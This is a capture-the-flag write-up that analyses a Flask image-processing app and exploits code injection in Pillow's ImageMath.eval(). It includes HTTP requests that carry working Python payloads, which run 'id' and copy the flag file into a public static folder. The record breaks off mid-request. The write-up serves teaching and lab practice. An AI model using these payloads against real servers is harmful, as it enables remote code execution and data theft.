# Amidst us

We are given the docker instance of a web application and its source code.

![1.png](Amidst%20us%2065a0d1b583bc44f6b3708760972c4b22/1.png)

This is how the website looks.

Let us see the source code now.

```python
from application.main import app

app.run(host='0.0.0.0', port=1337, debug=False)
```

We have a `run.py`. We are here dealing with a flask application.

```python
from flask import Flask, jsonify
from application.blueprints.routes import web, api

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(web, url_prefix='/')
app.register_blueprint(api, url_prefix='/api')

@app.errorhandler(404)
def not_found(error):
    return jsonify({'error': 'Not Found'}), 404

@app.errorhandler(403)
def forbidden(error):
    return jsonify({'error': 'Not Allowed'}), 403

@app.errorhandler(400)
def bad_request(error):
    return jsonify({'error': 'Bad Request'}), 400
```

The above is the `[main.py](http://main.py)`. The only thing worth noting here is that the application is using routes defined in `/blueprints/routes.py`.

Let us see the routes then.

```python
from flask import Blueprint, request, render_template, abort
from application.util import make_alpha

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
	return render_template('index.html')

@api.route('/alphafy', methods=['POST'])
def alphafy():
	if not request.is_json or 'image' not in request.json:
		return abort(400)

	return make_alpha(request.json)
```

The above is the `[routes.py](http://routes.py)` file. We can see 2 routes here →

- `/` → The root route only renders the `index.html` template.
- `/api/alphafy` → This route only accepts a POST [request.](http://request.It) It expects a JSON payload that must have a key called `image`. Finally it returns the output of the function `make_alpha()` that takes the JSON payload as input.

From the above, we can see that the function `make_alpha()` is defined in the `util.py`.

Let us see what is going on in the function.

```python
import os, base64
from PIL import Image, ImageMath
from io import BytesIO

generate = lambda x: os.urandom(x).hex()

def make_alpha(data):
	color = data.get('background', [255,255,255])

	try:
		dec_img = base64.b64decode(data.get('image').encode())

		image = Image.open(BytesIO(dec_img)).convert('RGBA')
		img_bands = [band.convert('F') for band in image.split()]

		alpha = ImageMath.eval(
			f'''float(
				max(
				max(
					max(
					difference1(red_band, {color[0]}),
					difference1(green_band, {color[1]})
					),
					difference1(blue_band, {color[2]})
				),
				max(
					max(
					difference2(red_band, {color[0]}),
					difference2(green_band, {color[1]})
					),
					difference2(blue_band, {color[2]})
				)
				)
			)''',
			difference1=lambda source, color: (source - color) / (255.0 - color),
			difference2=lambda source, color: (color - source) / color,
			red_band=img_bands[0],
			green_band=img_bands[1],
			blue_band=img_bands[2]
		)

		new_bands = [
			ImageMath.eval(
				'convert((image - color) / alpha + color, "L")',
				image=img_bands[i],
				color=color[i],
				alpha=alpha
			)
			for i in range(3)
		]

		new_bands.append(ImageMath.eval(
			'convert(alpha_band * alpha, "L")',
			alpha=alpha,
			alpha_band=img_bands[3]
		))

		new_image = Image.merge('RGBA', new_bands)
		background = Image.new('RGB', new_image.size, (0, 0, 0, 0))
		background.paste(new_image.convert('RGB'), mask=new_image)

		buffer = BytesIO()
		new_image.save(buffer, format='PNG')

		return {
			'image': f'data:image/png;base64,{base64.b64encode(buffer.getvalue()).decode()}'
		}, 200

	except Exception:
		return '', 400
```

The above is the code for `util.py`. From it, we can see that the JSON payload from the client side can also have a key called `background` that should have a list with 3 integer values.

Then it decodes the image (which is supposed to be base64 encoded).

After that, a couple of `ImageMath.eval()` is used to do some stuff on the image, and the image is returned at the end.

Now, `eval` is always a dangerous function if unsanitized input is provided to it. 

Now if we google a bit, we will find that `ImageMath.eval()` before `Pillow` version `9.0.0` allows evaluation of arbitrary expressions, such as one that uses python’s `exec()` function.

You can read about it [here](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#restrict-builtins-available-to-imagemath-eval).

Basically, we can just execute arbitrary python code with something like - 

```python
ImageMath.eval("exec(exit())")
```

Now if we can run arbitrary python code, it is just as similar to running arbitrary OS commands on the server.

Let us fire up the local docker instance and test it.

```bash
POST /api/alphafy HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 3363
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"image":"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","background":[255,255,255]}
```

```bash
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.7.13
Date: Thu, 19 May 2022 16:35:22 GMT
Content-Type: application/json
Content-Length: 3771
Connection: close

{"image":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAKuElEQVR4nO2de6wcVR3HP2d2h7aU0kLsgxZtEaliraXWV6LERyJp0WjwFZHiA4gEIxiiqdH4IDFqDCo+MFGxEaNRUaOJ0BtLFKtU/qgVsUKCCtJSofRaEPvAizt7j3+cO3vnnjs7j915/M7d+SVN787Z+Zzf/r5nZ3bO/OZ3lO/TBjTQ7XTIbb4PQAtQkc0NzxGeV2VnDU8ez6uys4Ynj6f6NxXfWcOTx/Oq7KzhyePlGgDSnG94w/MynwIkOj8A7zTgucBaYDGwcOr9J4CjwAPA/cCROfJ5Uy3TAJDqfBovCFBaswW4EHgNRvws9hDwG2Cn5zHWajFRhn8SeKkDQLLz/XhBwEqtuQa4FFiWn4qO/P0k8EPgC5iBMbR/CIpf4gCQ7rzNCwJO15rrgMuAefmJPX9sU0AA/AD4KPDoIP5F+GLi13cAuOB8lNfpcCnweWBpftoMf2yzY3QU+DhwY5/3x/oX4YuKX+wAcMV5QAUBi7TmRuBiMv6m6WNZxI/ar4CtwOEk/yy+uPjN+oAuOR8EnAGMac06qhU/tH8AFwAPxvln8cXFDwvqlPOdDmcBO4E11CN+aIcxg2CfS/ELt6mkxqI7K4oXBDxDa3ZhrufrFD+0ceAVvs9DOBC/KM+rsrMieN0u84EdyBEfzKXmbUHAYosvLn42z3NJfIDJSa7Xmo3IET/krdWab0Rei4yfzfOq7GxYXqfDFuBK5Ikf2luDgHciNH5xPDWVEVRJZ8Pwul0WTE7yJ+Ds/LQZ/thW9GAaB84F/p0HVNeR2EtqLLqzYXhaczXyxVfAcuBjeUB1nobDI4Bo8ae+/Q8w2Lx+6I9tZZ5GTgBnAf9KA9X9G8yJnMDJSS7BHfHB3Ga+Mg1Ut/jgSE4g8J78xN7+tlX1A/LdSX1JEJ8kB8vobEDec4C/D+BmneKH9jJgj71RivjgRk7gBfmpIsSHGN8liQ9u5AS+OidWivhgspB6Jk18yDEAanT+RTmwksSHiO8SxYeMH6ZG50/CXFK1STdp4oe2wvc5jEDxIcMRoOaR+yzcFh/M7WqR4kPKABBw2Do1A1ay+CjFaQgV3/cTBoAA8QFOScGKFh/QWrPI4osRH2jFDgAh4gMktYoXH0Cp3mcQJz6gZg0AQeIDHO+z3Qnxp+woQsUH6xQgTHyAIzHbXBIfrXkcoeIT/UOg+KH9h+kfg06JD0wqxSlaM5EX1OQETtv9kf1tkyw+wMOSxceFnEDgLtwUXwG784KanMDZvF0xTS6ID3BHHlCTExjDCwIWas1B6F1PuyJ+AJxJzKNjcdbkBPbhtds8BfxsqskV8QF+iXDxYXoAiBQ/3KYU23FLfICbsoDq/g2mfJ9WVZ0NydsFvCo/tRbx7wNeCEwmgeoWHxzJCZzifYr44CdZXVcPn8AB8QE8R8QH+C2mVEtWq0v824GfJ4GkiA8DBKRm51cA+0ivAlKX+MeAjUTqBdgmSXxwIycwao8B78CkivezOieN3o9D4oMbOYG23QF8sk9bneLfAHy/H0hQ/GaY9JzAJPsScK21v21Vif8j4BL6/PATGj9Afk5gkn0IuD6yv21Vif894F04KD7IzwlMMu37bAO2YaZdo1aF+Br4DOYRsFjvhccP308IlAvOh7xOh1divomrqEb8Ixjhx7L4Z/FFxU96TmAmnu+z2/PYAHyN5CuEJMsivsYMtHXMAfFBfk5gZl6rxRPABzFP4/yYlJk4y9LE18BtwMsx5/vxvP4hNH4qqbHozirmnYM5TG8FVidgk8Q/hKkPfDNwb8H+pVqTE1gMTwEvAF6L+QaH6wUsZKb4E8Dfpv7twcw33EPGI4mgz5uLp5Iai+5MEq/b5SStTbKpUpxotfifJP+q4imXnW94w/NcyAlseCXyvCo7a3jyeOJzAhteuTwncgIbXnk8J+oENrzyeO0qO6uTFwQs1ZrVwEpgPqb2wMKp9uOYUjQTmAWh9mMmgSrzry7eQDdOpDjfxzxgPWbS5yVK8WKtOQdYQL7PO4FZSPKPmImhva0Wf/a83r0GKZ93pHIC+9nJwGbg9cAbiM8ZLOIu4eOYBz52KMUOrTmWFyQtfrmCIs15YBPm5sxW4PTI/raVcYt4ArgV+Bbw6z7vm2EC45c9MIKc94CLMCXZ7RqCdWUG3Qd8DriF2ckpgKj4zbBMwRHk/NuA64Dnx7TVmRYW2oPApzE5A72bSILiN8tSAyTE+XOBL9O/brAE8aN2N3AN8Hsh8etr0nMC5wNfBP6CO+KDOTXdCXyz22UxQsWXnhO4HnMo3ZCAlSi+zdsPXO773Ikw8RGcE3gVsBf3xQdTKvb2IGBbtytLfJC3dvA8zKrcV6RgXRHf5t2KuWQ9mhU0SjmBS4BfAOenYF0VP7S7gS0kJJaGNko5gcsxM2znpWBdFz+0WauO2zZKOYErMM/+r03BzhXxQzuIOdodsBuq1KPuOoFLMA9YjJr4AM/ETCGfEd04SjmBCzCH/Y0pWAlilcU7G9jJVCncUcsJvAmzrFqSSRKrLN564Bal6vky1pUT+BHM8/RJJlGssnibteaz1PBlrGPt4Jdiauj6CVjJYpXF08BFvs8YFepRdZ3AxZjHrdYkYF0QqyzeuFJsard5pKoZw6rrBN5AI34Sb5nWfHWu5gSej7ne79ena2KVyXsTZlY0k7mQE+hjDv1xiRzh/kP7Nod4BzCxeioNNOylY1V1Ai+nET8PbzVwdRrIlZzABZhn7s+MaZsLYpXFexIzUfREXGNRk0aZjgBDdvY+GvEH4S0BPhDX4FJOYAv4K2YkR63u4LrCG8ecDnoLT7mWE/hGGvGH4S0DLg5flHGvoOy1gy+zXksKriu890J5N4pinSmos6XAI0xP+UoMrgs8DTzb9zlIweJDuXUC30wjfhE8BbydEsSHctcO3hzZ3zYpwXWF9zrrtficwDbmSdpFMW3SgusC72nPY0WrxXEKvndTytrBmFm/RvziePO0ZgMO5QRuimmSGlwneFqzwZmcQKVmzfuLDq4jvHV5QbXlBGo9Y+rXheC6wFuVB1R3TuDyqf9dCa4LvJVZQXlO62XVCTwZt4LrAm9+FpCUOoG58gwsmwtilcEr5cZdKTmBwH/zE3v72+aiWGXwEmM66NVcWWsHH5q1U7rNJbHK4D3ar2GYS/nch+qMne3Pia07uC7wDsRtlJoT+IccWAnBdYG3x95QxCReWWsH30W2tXakBNcF3u7oC+k5gYeA36VgJQVXOm8vpqgEUOy9mzLXDv5OQpuk4LrAuzn8o+h7N4lOFJAQei/wPGu7tOBK5z2MKaDxtGs5gV3MCt/RAEgLrgu8D1OS+FRQJ3AM+Epkf9vqDq503reBnzhdJ1ApPK35LrMLQtQdXOm8MeAtvs8EJVYOKTMnEN+HdhvVanEF8HWmA1N3cKXztmOKRZQq/gzHqihQ1OlwIeaUsCY/seePbXWLVSTvn8C1wE/ncp1AH7PKx1XEp471M2liFcm7B1M0azsl/uCL49W9dvBqTPr4eZiUp1WYMjKnMrOGkCSxBuV1gGOYp34fw1wi78OUyutVDK1aj7BGUB3iNzwBvGbt4BHnNWsHjzivWTt4xHnN2sEjzqu6TmDDE8Yb6NJHivMNb3heWTmBDc8RXlV1AhueUF5ZOYENzxFeFXUCG55g3v8ByoShTg6CZ1cAAAAASUVORK5CYII="}
```

Since the elements of `background` is being used inside `ImageMath.eval()` within format strings, we can inject our payload in one of the element.

Let us try to inject commands here.

**PAYLOAD** → `exec("import os; os.system('id')")`

```bash
POST /api/alphafy HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 3398
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"image":"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","background":["exec(\"import os; os.system('id')\")",255,255]}
```

This time we do not see any sort of response in burpsuite. But if we see the application console in docker we get to see the output.

```bash
172.17.0.1 - - [19/May/2022 16:30:15] "GET /static/js/jquery-3.6.0.min.js HTTP/1.1" 200 -
172.17.0.1 - - [19/May/2022 16:30:41] "POST /api/alphafy HTTP/1.1" 200 -
172.17.0.1 - - [19/May/2022 16:35:22] "POST /api/alphafy HTTP/1.1" 200 -
uid=1000(www) gid=1000(www) groups=1000(www)
2022-05-19 16:37:56,329 INFO exited: flask (terminated by SIGSEGV (core dumped); not expected)
2022-05-19 16:37:57,344 INFO spawned: 'flask' with pid 23
```

So we have a blind command injection here.

In that case, I know 2 methods to exfiltrate the contents of flag.

- I can use OAST techniques to make the server make network connections with a domain that I control and make the server include the contents of flag within the interaction.
- Since this is a flask based application, I can copy the flag file to the `/static` folder of the application, so that I can view it from the browser itself.

The second method is much simpler.

From the docker instance, I can find the absolute path of the `/static` folder.

```bash
/app # ls ..
app       dev       flag.txt  lib       mnt       proc      run       srv       tmp       var
bin       etc       home      media     opt       root      sbin      sys       usr
/app # ls application/static/images/
arrow.png         favicon.gif       upload-doc.png    us-converted.png  us.png
```

The path is `/app/application/static/images`.

**PAYLOAD** → `exec("import os; os.system('cp /flag.txt /app/application/static/images/flag.txt')")`

```bash
POST /api/alphafy HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1:1337/
Content-Type: application/json
Origin: http://127.0.0.1:1337
Content-Length: 3448
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"image":"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